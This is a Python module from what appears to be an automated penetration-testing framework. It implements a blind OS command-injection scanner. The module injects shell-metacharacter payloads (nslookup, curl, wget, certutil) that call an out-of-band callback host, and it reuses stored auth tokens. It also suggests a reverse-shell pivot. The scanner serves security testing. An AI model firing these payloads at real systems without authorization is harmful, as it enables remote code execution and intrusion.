"""`scan_blind_cmd_injection` — OOB-DNS blind command-injection
specialist (workitem.md Phase 4.3).

Closes the rest of CWE-78 / CWE-77 / CWE-94. Phase 2.6
`scan_cmd_injection` (in-band) catches cases where the OS command's
stdout is reflected in the response. This specialist catches the
class where the command runs but stdout is NOT echoed — confirmation
relies on watching for an OOB-DNS callback fired by the command.

Detection model
---------------

For each candidate param, send payloads of the form
`;<exfil-cmd> <oob-host>` where `<exfil-cmd>` is a network primitive
(`nslookup`, `curl`, `wget`, `dig`, `ping`) that hits the OOB-DNS
service when executed. Then poll the OOB service for a hit on the
unique strix-prefixed token embedded in the host.

Probe families:

  * **Linux/Unix**
    * `; nslookup <token>.<oob-host>`
    * `&& nslookup <token>.<oob-host>`
    * `| nslookup <token>.<oob-host>`
    * `` `nslookup <token>.<oob-host>` ``
    * `$(nslookup <token>.<oob-host>)`
    * `; curl http://<callback-url>`
    * `; ping -c 1 <token>.<oob-host>`

  * **Windows**
    * `& nslookup <token>.<oob-host>`
    * `| nslookup <token>.<oob-host>`
    * `& certutil -urlcache -split -f http://<callback-url> nul`

The OOB host's DNS lookup OR the HTTP callback fires our service.
The token in the host/path lets us key the hit back to the specific
probe (and in turn the specific param + URL).

Severity: critical (RCE; the chain confirms remote code execution
on the server even though stdout isn't reflected).

Depends on Phase 1.3 OOB-DNS infra. Returns status=partial when
disabled.
"""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, payload_template, os_label)
# `{host}` placeholder is replaced with `<token>.<oob-host>` (DNS-only
# probes) or the full callback URL for HTTP-based probes.
# `{cb}` placeholder receives the full callback URL.
_PROBES: tuple[tuple[str, str, str, str], ...] = (
    # ---------- Linux/Unix DNS exfil ----------
    (
        "linux_semicolon_nslookup",
        "test;nslookup {host}",
        "linux",
        "Inline DNS lookup via shell metachar `;`",
    ),
    (
        "linux_amp_amp_nslookup",
        "test&&nslookup {host}",
        "linux",
        "Conditional DNS lookup via `&&`",
    ),
    (
        "linux_pipe_nslookup",
        "test|nslookup {host}",
        "linux",
        "Pipe to nslookup",
    ),
    (
        "linux_backtick_nslookup",
        "test`nslookup {host}`",
        "linux",
        "Command substitution via backticks",
    ),
    (
        "linux_dollar_paren_nslookup",
        "test$(nslookup {host})",
        "linux",
        "Command substitution via `$(...)`",
    ),
    (
        "linux_semicolon_curl",
        "test;curl {cb}",
        "linux",
        "HTTP callback via curl",
    ),
    (
        "linux_semicolon_wget",
        "test;wget {cb}",
        "linux",
        "HTTP callback via wget",
    ),
    # ---------- Windows ----------
    (
        "windows_amp_nslookup",
        "test&nslookup {host}",
        "windows",
        "Windows cmd `&` chain to nslookup",
    ),
    (
        "windows_pipe_nslookup",
        "test|nslookup {host}",
        "windows",
        "Windows cmd `|` chain to nslookup",
    ),
    (
        "windows_certutil",
        "test&certutil -urlcache -split -f {cb} nul",
        "windows",
        "Windows certutil HTTP callback",
    ),
)


def _build_url_with_param(
    url: str, param_name: str, value: str,
) -> str:
    """Substitute the named param in the URL's query string.
    The `safe=` arg preserves shell metacharacters (semicolon,
    pipe, ampersand, backtick, dollar-paren) so the payload
    reaches the server intact."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    flat[param_name] = value
    return urlunparse(
        parts._replace(query=urlencode(flat, doseq=False, safe=";|&`$()/")),
    )


def _callback_dns_host(callback_url: str, token: str) -> str:
    """For DNS-based probes we want a hostname under the OOB domain
    that includes our token as a subdomain (so the OOB service can
    correlate the inbound DNS query to our probe).

    For local-listener backends the callback URL is `http://host:port/<token>` —
    we extract host:port and prepend the token as a subdomain (works
    because the local listener just keys off the path; the DNS lookup
    we're substituting wouldn't actually reach it anyway, but the
    HTTP callback variants WILL hit it).

    For interactsh-style backends the URL ends in
    `https://<token>.<host>` — we just return that host with the
    scheme stripped.
    """
    parsed = urlparse(callback_url)
    host = parsed.netloc or parsed.path
    # If the token is in the path (local listener), pull it out
    # and prepend.
    if token in (parsed.path or "") and token not in host:
        return f"{token}.{host}"
    return host


def _emit_finding(
    *,
    url: str,
    param: str,
    payload_label: str,
    payload: str,
    os_label: str,
    description_label: str,
    callback_url: str,
    source_ip: str | None,
    raw_request_excerpt: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        return tracer.add_vulnerability_report(
            title=(
                f"Blind OS command injection in `{param}` "
                f"({os_label}, {payload_label})"
            ),
            severity="critical",
            cwe="CWE-78",
            endpoint=url,
            target=url,
            category="command_injection",
            verification_status="verified",
            confidence=0.97,
            description=(
                f"The `{param}` parameter at `{url}` is concatenated "
                f"into a shell command on the server. The OOB-DNS "
                f"probe `{payload_label}` ({description_label}) "
                f"caused the server to execute `nslookup`/`curl`/"
                f"`certutil` against our callback URL "
                f"`{callback_url}`. The OOB service received the "
                f"inbound request from `{source_ip or '?'}` — "
                f"confirms RCE even though stdout isn't reflected."
            ),
            impact=(
                "Remote code execution. The web app process executes "
                "attacker-controlled shell commands; stdout-blindness "
                "doesn't reduce impact, only changes the confirmation "
                "method.\n"
                "  * Read every file the process can access.\n"
                "  * Pivot into internal network via the parser host.\n"
                "  * Persist via cron / systemd / startup hooks.\n"
                "  * On Windows, escalate via token impersonation "
                "    (`whoami /priv`).\n"
                "Critical because in-band detection failed (the lead "
                "would have missed this without OOB)."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"OS: {os_label}\n"
                f"Probe: {payload_label}\n"
                f"Payload: {payload}\n"
                f"OOB callback URL: {callback_url}\n"
                f"Callback hit from: {source_ip or '?'}\n"
                f"Raw OOB request excerpt:\n{raw_request_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET {url} with `{param}` set to `{payload}`.\n"
                f"2. Server executes the chained shell command — "
                f"`nslookup`/`curl`/`certutil` hits our OOB host.\n"
                f"3. OOB service logs the inbound request from the "
                f"target host. Confirms RCE.\n"
                f"4. Pivot: replace the OOB exfil with a reverse "
                f"shell, file read, or any other shell primitive."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'"
            ),
            remediation_steps=(
                "1. NEVER pass user input to a shell. Use the "
                "language's process-execution API with an argv list, "
                "not a shell string:\n"
                "     # Python — UNSAFE: subprocess.run(f'ping {host}',"
                " shell=True)\n"
                "     # Python — SAFE:   subprocess.run(['ping', host])\n"
                "2. If shell invocation is unavoidable, allowlist the "
                "input to a strict character set "
                "(e.g. `[a-zA-Z0-9.-]` for hostnames) and reject "
                "anything else server-side.\n"
                "3. Egress firewall: block outbound DNS / HTTP from "
                "the application host to the public internet — defeats "
                "the OOB confirmation primitive (and reduces blast "
                "radius of an actual RCE).\n"
                "4. Run the web app as a low-privilege user inside a "
                "hardened container so a successful injection has "
                "minimal blast radius."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "H", "I": "H", "A": "H",
            },
            reasoning_trace=[
                f"Probed {param}= with OOB cmd-injection payload "
                f"`{payload_label}`.",
                f"Payload: {payload}",
                f"OOB callback URL embedded: {callback_url}.",
                f"OOB service received inbound from {source_ip}.",
                "Server executed attacker-controlled shell → RCE "
                "confirmed via OOB.",
            ],
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_blind_cmd_injection: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="cmd-injection-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 120},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1059", "T1190"],
)
def scan_blind_cmd_injection(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    extra_headers: dict[str, str] | None = None,
    oob_timeout_seconds: float = 8.0,
) -> SpecialistResult:
    """Blind command-injection scanner using OOB-DNS callbacks.

    Args:
        url: target URL.
        params: param names to probe. When None, scanner infers from
            URL query keys + cmd-shape lexicon.
        param: convenience alias for a single param name.
        extra_headers: forwarded as-is.
        oob_timeout_seconds: how long to wait per probe for OOB hit.

    Auto-emits one critical finding per OOB-confirmed param.
    Returns status=partial when OOB-DNS is unavailable.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # OOB precondition.
    try:
        from strix.tools.oob import (
            backend_name as oob_backend_name,
            is_available as oob_is_available,
            poll_callback,
            register_callback,
        )
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"OOB module unavailable: {type(e).__name__}: {e}",
        )

    if not oob_is_available():
        return SpecialistResult(
            status="partial",
            error=(
                "OOB-DNS backend not available — Phase 1.3 prerequisite. "
                "Set STRIX_OOB_BACKEND=local or interactsh."
            ),
            evidence=[f"backend: {oob_backend_name()}"],
            next_probes_suggested=[
                "scan_cmd_injection (Phase 2.6) covers the in-band case "
                "without OOB; deploy OOB-DNS infra (Phase 1.3) for blind "
                "variants"
            ],
        )

    # Forgiving args.
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        cmd_lexicon = {
            "host", "hostname", "addr", "ip", "domain", "target",
            "url", "ping", "lookup", "dns", "cmd", "command", "exec",
            "shell", "run", "execute", "query", "input", "data",
            "file", "filename", "path", "name",
        }
        params = [k for k in qs_keys if k.lower() in cmd_lexicon]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no cmd-shaped params found",
        )

    # Auth auto-injection.
    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        for label, payload_template, os_label, description_label in _PROBES:
            cb = register_callback(ttl_seconds=int(oob_timeout_seconds * 4))
            if cb is None:
                evidence.append(f"{label}: register_callback returned None")
                continue
            host = _callback_dns_host(cb.callback_url, cb.token)
            payload = payload_template.format(host=host, cb=cb.callback_url)
            probe_url = _build_url_with_param(url, p, payload)
            try:
                pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"{label}: transport error: {e}")
                continue

            result = poll_callback(cb.token, timeout_seconds=oob_timeout_seconds)
            if not result.get("hit"):
                continue

            seen_endpoint_param.add(key)
            rid = _emit_finding(
                url=url, param=p, payload_label=label,
                payload=payload, os_label=os_label,
                description_label=description_label,
                callback_url=cb.callback_url,
                source_ip=result.get("source_ip"),
                raw_request_excerpt=str(result.get("raw_request") or ""),
            )
            if rid:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"Blind cmd injection in `{p}` ({label})",
                severity="critical", cwe="CWE-78",
                endpoint=url, category="command_injection",
                verification_status="verified", confidence=0.97,
                description=(
                    f"OOB-confirmed; src={result.get('source_ip','?')}"
                ),
            ))
            evidence.append(
                f"{label}: OOB hit from {result.get('source_ip','?')} "
                f"(token {cb.token})"
            )
            break  # one finding per param

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(
            url, method="GET", params=params,
            probed_for="blind_command_injection",
        )
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_blind_cmd_injection"},
            input={
                "params": list(params),
                "oob_backend": oob_backend_name(),
                "probes_sent": probe_count,
            },
            output={
                "findings_emitted": emitted_count,
                "drafts": len(drafts),
            },
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["pivot to reverse-shell payload (sandbox-only); audit "
             "egress rules and process privilege"]
            if drafts else
            ["no blind cmd injection on listed params; consider "
             "POST/JSON body fields, header-based injection, and "
             "pre-encoded shell metacharacters"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "oob_backend": oob_backend_name(),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
